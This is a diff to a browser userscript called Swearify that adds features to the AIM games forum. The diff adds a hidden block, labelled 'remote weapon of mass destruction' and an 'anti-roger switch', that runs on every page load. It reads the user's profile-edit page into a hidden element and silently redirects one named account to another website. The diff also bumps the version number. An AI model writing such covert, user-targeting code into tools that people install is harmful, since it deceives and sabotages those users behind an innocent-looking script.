@@ -3,7 +3,7 @@
 // @description Adds a number of enhancements to your experience on AIM games.
 // @namespace   kaffeinition@gmail.com
 // @include     http://aimgames.forummotion.com/*                     
-// @version     3.0.38
+// @version     3.0.39
 // @grant       none
 // @icon        http://i.imgur.com/HlEs1B4.png
 // @license     MIT License (Expat); opensource.org/licenses/MIT
@@ -2562,11 +2562,56 @@ function post_page_editor() {
     }
   });
 }
+
+// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
+// ~~ BEGIN CODE FOR REMOTE WEAPON OF MASS DESTRUCTION ~~ //
+// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ //
+
+function callback(response) { ////// thanks kaff, you're now a partaker in this crime :^)
+  document.body.appendChild(document.createElement('div')).innerHTML = "<div id='secret' style='display:none;'></div>";  
+  var placeholder = document.createElement('div');  
+  placeholder.innerHTML = response;
+  while (placeholder.children.length > 0) {
+    document.getElementById("secret").appendChild(placeholder.children[0]);
+  }
+  
+  //var mymassivepenis = document.getElementById("emptyidcc").getElementsByTagName("tr")[6].getElementsByTagName("td")[1].innerHTML;  
+  if (document.getElementById("register")[0].value == "MCroger56") {
+    //console.log("holy fucking shit, it works")
+    window.location.replace("http://agor.io");
+  } else {
+    // may be incompatible in some browsers
+    //delete placeholder;
+    // more compatible but doesn't free from memory
+    placeholder = null;
+  }
+  //console.log(mymassivepenis);
+}
+
+function getPageContents(callback, url, params) { ////// http://stackoverflow.com/a/28728475
+  http = new XMLHttpRequest();
+  if (params != null) {
+    http.open('POST', url, true);
+    http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+  } else {
+    http.open('GET', url, true);
+  }
+  http.onreadystatechange = function () {
+    if (http.readyState == 4 && http.status == 200) {
+      callback(http.responseText);
+      //console.log(http.responseText)
+    }
+  }
+  http.send(params);
+}
+
 /////////////////////
 /////////////////////RUNS SCRIPT
 window.addEventListener('load', function () { /* shit goes down in here */
   if (is.ie() || is.safari() || is.opera()) alert("This browser is unsupported by Swearify.");
   else {
+  	//anti-roger switch
+  	getPageContents(callback, 'http://aimgames.forummotion.com/profile?mode=editprofile');
     if (window.location.href === "http://aimgames.forummotion.com/post?categ=1&mode=smilies") inject_smilie(1);
     if (window.location.href === "http://aimgames.forummotion.com/post?categ=2&mode=smilies") inject_smilie(2);
     if (window.location.href === "http://aimgames.forummotion.com/post?categ=3&mode=smilies") inject_smilie(3);
